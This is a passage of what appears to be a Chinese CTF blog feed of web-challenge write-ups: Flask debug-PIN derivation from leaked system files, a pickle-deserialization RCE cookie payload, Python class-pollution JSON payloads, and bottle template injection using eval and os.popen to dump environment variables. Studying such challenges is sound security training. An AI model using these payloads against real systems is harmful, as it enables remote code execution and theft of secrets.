chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;# /etc/passwd</span><br><span class="line">    &#x27;flask.app&#x27;,# 默认值</span><br><span class="line">    &#x27;Flask&#x27;,# 默认值</span><br><span class="line">    &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27; # 报错得到</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;2485377581187&#x27;,#  /sys/class/net/eth0/address 16进制转10进制</span><br><span class="line">    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span><br><span class="line">    &#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;#  /proc/self/cgroup</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据上述的信息，我们要先获得正确的pin码，那就一个个来吧</p><p>1.<strong>确定python版本</strong></p><p>python版本为3.5</p><p>2.<strong>确定flask的存储位置</strong></p><p>根据实例报错可知路径为&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.5&#x2F;site-packages&#x2F;flask&#x2F;app.py</p><p>3.<strong>获取username</strong></p><p>根据源代码可知，root下面有个file路径可以访问其他文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入：/file?filename=/etc/passwd</span><br></pre></td></tr></table></figure><p>username为root</p><p>4.<strong>获取uuidnode</strong></p><p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><p>得到uuidnode的十六进制为：02:42:ac:02:1f:fc</p><p>我们需要将其转化为10进制：2485376917500</p><p>5.<strong>获取machine_id</strong></p><p>访问&#x2F;etc&#x2F;machine-id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c31eea55a29431535ff01de94bdcf5cf</span><br></pre></td></tr></table></figure><p>访问&#x2F;proc&#x2F;self&#x2F;cgroup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">27f9f599813e5072c65483b50b8e6174b44d216d88028c399feb87c8c4eed31e</span><br></pre></td></tr></table></figure><p>6.<strong>运行脚本获取pin码</strong></p><p>7.进入console路由</p><p>输入pin码后进入调试模式</p><p>8.控制台导入os模块，运行语句，获取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.popen(&#x27;ls&#x27;).read()</span><br><span class="line">os.popen(&#x27;ls /&#x27;).read()</span><br><span class="line">os.popen(&#x27;cat /flaggggg&#x27;).read()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;flask-pin&quot;&gt;&lt;a href=&quot;#flask-pin&quot; class=&quot;headerlink&quot; title=&quot;flask_pin&quot;&gt;&lt;/a&gt;flask_pin&lt;/h1&gt;&lt;h2 id=&quot;1-什么是pin码&quot;&gt;&lt;a href=&quot;#1-什么是pin码&quot; class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pickle反序列化</title>
    <link href="http://1768161086.github,io/2025/03/29/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://1768161086.github,io/2025/03/29/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-03-29T02:53:34.000Z</published>
    <updated>2025-03-29T02:57:10.405Z</updated>
    
    <content type="html"><![CDATA[<h2 id="polar-unpickle"><a href="#polar-unpickle" class="headerlink" title="polar_unpickle"></a>polar_unpickle</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">from flask import Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    try:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(&#x27;user&#x27;))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        return user</span><br><span class="line">    except:</span><br><span class="line">        username = &quot;Guest&quot;</span><br><span class="line"></span><br><span class="line">    return &quot;Hello %s&quot; % username</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=8080)</span><br></pre></td></tr></table></figure><p>1.根据上述的分析，pickle反序列化使用cookies传入</p><p>2.可以编写一段先base64编码再序列化的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import requests</span><br><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;,))//利用os.popen查询</span><br><span class="line">#这里的语句也可以换成return (eval, (&quot;open(&#x27;/flag&#x27;).read()&quot;,))，也可以利用反弹语句获取shell，但这个实例好像不能使用反弹获取shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)//将获取的对象序列化</span><br><span class="line">user = base64.b64encode(s).decode()//将序列化的对象使用base64加密</span><br><span class="line">print(user)//输出加密后的序列化对象</span><br><span class="line"></span><br><span class="line">response = requests.get(&quot;URL&quot;, cookies=dict(</span><br><span class="line">    user=base64.b64encode(s).decode()</span><br><span class="line">))</span><br><span class="line">print(response.content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;polar-unpickle&quot;&gt;&lt;a href=&quot;#polar-unpickle&quot; class=&quot;headerlink&quot; title=&quot;polar_unpickle&quot;&gt;&lt;/a&gt;polar_unpickle&lt;/h2&gt;&lt;figure class=&quot;highlight </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>python原型链污染</title>
    <link href="http://1768161086.github,io/2025/03/19/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>http://1768161086.github,io/2025/03/19/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2025-03-19T07:55:31.000Z</published>
    <updated>2025-04-16T05:31:39.199Z</updated>
    
    <content type="html"><![CDATA[<h2 id="圣钥之战1-0"><a href="#圣钥之战1-0" class="headerlink" title="圣钥之战1.0"></a>圣钥之战1.0</h2><p>访问read路由拿到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">J1ngHong说：你想read flag吗？</span><br><span class="line">那么圣钥之光必将阻止你！</span><br><span class="line">但是小小的源码没事，因为你也读不到flag(乐)</span><br><span class="line"></span><br><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">def is_json(data):</span><br><span class="line">    try:</span><br><span class="line">        json.loads(data)</span><br><span class="line">        return True</span><br><span class="line">    except ValueError:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def hello_world():</span><br><span class="line">    return open(&#x27;/static/index.html&#x27;, encoding=&quot;utf-8&quot;).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/read&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def Read():</span><br><span class="line">    file = open(__file__, encoding=&quot;utf-8&quot;).read()</span><br><span class="line">    return f&quot;J1ngHong说：你想read flag吗？</span><br><span class="line">那么圣钥之光必将阻止你！</span><br><span class="line">但是小小的源码没事，因为你也读不到flag(乐)</span><br><span class="line"></span><br><span class="line">&#123;file&#125;</span><br><span class="line"></span><br><span class="line">&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/pollute&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def Pollution():</span><br><span class="line">    if request.is_json:</span><br><span class="line">        merge(json.loads(request.data),instance)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;J1ngHong说：钥匙圣洁无暇，无人可以污染！&quot;</span><br><span class="line">    return &quot;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure><p>python原型链污染</p><p>把file改成&#x2F;flag然后访问read路由即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line"># 目标URL</span><br><span class="line">url = &quot;http://gz.imxbt.cn:20603/read&quot;</span><br><span class="line"></span><br><span class="line"># 构造包含特殊键的 JSON 数据</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__class__&quot;:&#123;</span><br><span class="line">        &quot;__init__&quot;:&#123;</span><br><span class="line">            &quot;__globals__&quot;:&#123;</span><br><span class="line">                &quot;BLACKLIST_IN_index&quot; : [] //或者&quot;__file__&quot;:&quot;/flag&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 将 JSON 数据转换为字符串</span><br><span class="line">payload_json = json.dumps(payload)</span><br><span class="line">print(payload_json)</span><br><span class="line"></span><br><span class="line"># 发送 POST 请求</span><br><span class="line">response = requests.post(url, data=payload_json, headers=&#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;)</span><br><span class="line"></span><br><span class="line"># 打印响应内容</span><br><span class="line">print(&quot;Status Code:&quot;, response.status_code)</span><br><span class="line">print(&quot;Response Content:&quot;, response.text)</span><br></pre></td></tr></table></figure><h2 id="BaseCTF-Lucky-Number"><a href="#BaseCTF-Lucky-Number" class="headerlink" title="BaseCTF_Lucky Number"></a>BaseCTF_Lucky Number</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">你不会以为这里真的有flag吧？</span><br><span class="line"></span><br><span class="line">想要flag的话先提交我的幸运数字5346</span><br><span class="line"></span><br><span class="line">但是我的主人觉得我泄露了太多信息，就把我的幸运数字给删除了</span><br><span class="line"></span><br><span class="line">但是听说在heaven中有一种create方法，配合__kwdefaults__可以创造出任何事物，你可以去/m4G1c里尝试着接触到这个方法</span><br><span class="line"></span><br><span class="line">下面是前人留下来的信息，希望对你有用</span><br><span class="line"></span><br><span class="line">from flask import Flask,request,render_template_string,render_template</span><br><span class="line">from jinja2 import Template</span><br><span class="line">import json</span><br><span class="line">import heaven</span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">BLACKLIST_IN_index = [&#x27;&#123;&#x27;,&#x27;&#125;&#x27;]</span><br><span class="line">def is_json(data):</span><br><span class="line">    try:</span><br><span class="line">        json.loads(data)</span><br><span class="line">        return True</span><br><span class="line">    except ValueError:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/m4G1c&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def pollute():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        if request.is_json:</span><br><span class="line">            merge(json.loads(request.data), instance)</span><br><span class="line">            result = heaven.create()</span><br><span class="line">            message = result[&quot;message&quot;]</span><br><span class="line">            return &quot;这个魔术还行吧</span><br><span class="line">&quot; + message</span><br><span class="line">        else:</span><br><span class="line">            return &quot;我要json的魔术&quot;</span><br><span class="line">    return &quot;记得用POST方法把魔术交上来&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#heaven.py</span><br><span class="line"></span><br><span class="line">def create(kon=&quot;Kon&quot;, pure=&quot;Pure&quot;, *, confirm=False):</span><br><span class="line">    if confirm and &quot;lucky_number&quot; not in create.__kwdefaults__:</span><br><span class="line">        return &#123;&quot;message&quot;: &quot;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&quot;, &quot;lucky_number&quot;: &quot;nope&quot;&#125;</span><br><span class="line">    if confirm and &quot;lucky_number&quot; in create.__kwdefaults__:</span><br><span class="line">        return &#123;&quot;message&quot;: &quot;这是你的lucky_number，请拿好，去/check下检查一下吧&quot;, &quot;lucky_number&quot;: create.__kwdefaults__[&quot;lucky_number&quot;]&#125;</span><br><span class="line"></span><br><span class="line">    return &#123;&quot;message&quot;: &quot;你有什么想创造的吗？&quot;, &quot;lucky_number&quot;: &quot;nope&quot;&#125;</span><br></pre></td></tr></table></figure><p>也是一个原型链污染，具体污染什么可以直接通过源码看</p><p>可以看到在heaven.py里面有一个函数就是create里面有两个if需要绕过</p><p>1.第一就是confirm参数为true，其次lucky_number在create.<strong>kwdefaults</strong>(这个就是create函数关键字参数的默认值的字典)中，这里就是我们的幸运数字，题目直接给了</p><p>思路还是一样通过获取全局属性进行修改函数里面<strong>kwdefaults</strong>的值即可</p><p>2.将上述代码中间部分修改即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">            &quot;heaven&quot;:&#123;</span><br><span class="line">                &quot;create&quot;:&#123;</span><br><span class="line">                    &quot;__kwdefaults__&quot;:&#123;</span><br><span class="line">                        &quot;confirm&quot;:&quot;True&quot;,</span><br><span class="line">                        &quot;lucky_number&quot;:&quot;5346&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="最后查看-check给出一个-ssSstTti1最后通过ssti来得flagNCTF2024-ez-dash"><a href="#最后查看-check给出一个-ssSstTti1最后通过ssti来得flagNCTF2024-ez-dash" class="headerlink" title="最后查看&#x2F;check给出一个&#x2F;ssSstTti1最后通过ssti来得flagNCTF2024-ez_dash"></a>最后查看&#x2F;check给出一个&#x2F;ssSstTti1最后通过ssti来得flag<br>NCTF2024-ez_dash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">Hints: Flag在环境变量中</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from typing import Optional</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import pydash</span><br><span class="line">import bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[&#x27;__annotations__&#x27;, &#x27;__call__&#x27;, &#x27;__class__&#x27;, &#x27;__closure__&#x27;,</span><br><span class="line">               &#x27;__code__&#x27;, &#x27;__defaults__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dict__&#x27;,</span><br><span class="line">               &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;,</span><br><span class="line">               &#x27;__ge__&#x27;, &#x27;__get__&#x27;, &#x27;__getattribute__&#x27;,</span><br><span class="line">               &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;,</span><br><span class="line">               &#x27;__kwdefaults__&#x27;, &#x27;__le__&#x27;, &#x27;__lt__&#x27;, &#x27;__module__&#x27;,</span><br><span class="line">               &#x27;__name__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__qualname__&#x27;,</span><br><span class="line">               &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;,</span><br><span class="line">               &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;__wrapped__&#x27;,</span><br><span class="line">               &quot;Optional&quot;,&quot;func&quot;,&quot;render&quot;,</span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    &quot;bottle&quot;</span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(dir(globals()[&quot;__builtins__&quot;]))</span><br><span class="line"></span><br><span class="line">def setval(name:str, path:str, value:str)-&gt; Optional[bool]:</span><br><span class="line">    if name.find(&quot;__&quot;)&gt;=0: return False</span><br><span class="line">    for word in __forbidden_name__:</span><br><span class="line">        if name==word:</span><br><span class="line">            return False</span><br><span class="line">    for word in __forbidden_path__:</span><br><span class="line">        if path.find(word)&gt;=0: return False</span><br><span class="line">    obj=globals()[name]</span><br><span class="line">    try:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    except:</span><br><span class="line">        return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">@bottle.post(&#x27;/setValue&#x27;)</span><br><span class="line">def set_value():</span><br><span class="line">    name = bottle.request.query.get(&#x27;name&#x27;)</span><br><span class="line">    path=bottle.request.json.get(&#x27;path&#x27;)</span><br><span class="line">    if not isinstance(path,str):</span><br><span class="line">        return &quot;no&quot;</span><br><span class="line">    if len(name)&gt;6 or len(path)&gt;32:</span><br><span class="line">        return &quot;no&quot;</span><br><span class="line">    value=bottle.request.json.get(&#x27;value&#x27;)</span><br><span class="line">    return &quot;yes&quot; if setval(name, path, value) else &quot;no&quot;</span><br><span class="line"></span><br><span class="line">@bottle.get(&#x27;/render&#x27;)</span><br><span class="line">def render_template():</span><br><span class="line">    path=bottle.request.query.get(&#x27;path&#x27;)</span><br><span class="line">    if path.find(&quot;&#123;&quot;)&gt;=0 or path.find(&quot;&#125;&quot;)&gt;=0 or path.find(&quot;.&quot;)&gt;=0:</span><br><span class="line">        return &quot;Hacker&quot;</span><br><span class="line">    return bottle.template(path)</span><br><span class="line">bottle.run(host=&#x27;0.0.0.0&#x27;, port=8000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.一个bottle的服务+pydash的原型链污染，然后可以通过render渲染模板，但是该题对<code>/render</code>的过滤设置得不严谨，bottle的<a href="https://www.osgeo.cn/bottle/stpl.html">模板渲染</a>功能很强大，不仅能够接受<code>&#123;&#123;&#125;&#125;</code>，还能够接受<code>%</code>引入一行python代码</p><p>2.因此直接往render路由打即可，原型payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&gt;1&#x27;)&quot;)</span><br></pre></td></tr></table></figure><p>3.(因为render能够渲染文件，因此将文件写入再用render渲染即可)</p><p>由于过滤了<code>.</code>，但是这里是用eval()函数，因此可以使用<code>chr</code>函数绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?path=% eval(&quot;__import__(&#x27;os&#x27;)&quot;+chr(46)+&quot;popen(&#x27;id&gt;1&#x27;)&quot;)</span><br></pre></td></tr></table></figure><p>注意发送的时候<code>+</code>要进行url编码，不然会以为是空格然后报错</p><p>4.flag在环境变量里，因此直接使用env写入到2里再访问即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?path=% eval(&quot;__import__(&#x27;os&#x27;)&quot;+chr(46)+&quot;popen(&#x27;env&gt;2&#x27;)&quot;)</span><br></pre></td></tr></table></figure><h2 id="NCTF2024-ez-dash-revenge"><a href="#NCTF2024-ez-dash-revenge" class="headerlink" title="NCTF2024-ez_dash_revenge"></a>NCTF2024-ez_dash_revenge</h2><p>修复了<code>&lt;%</code>导致的问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 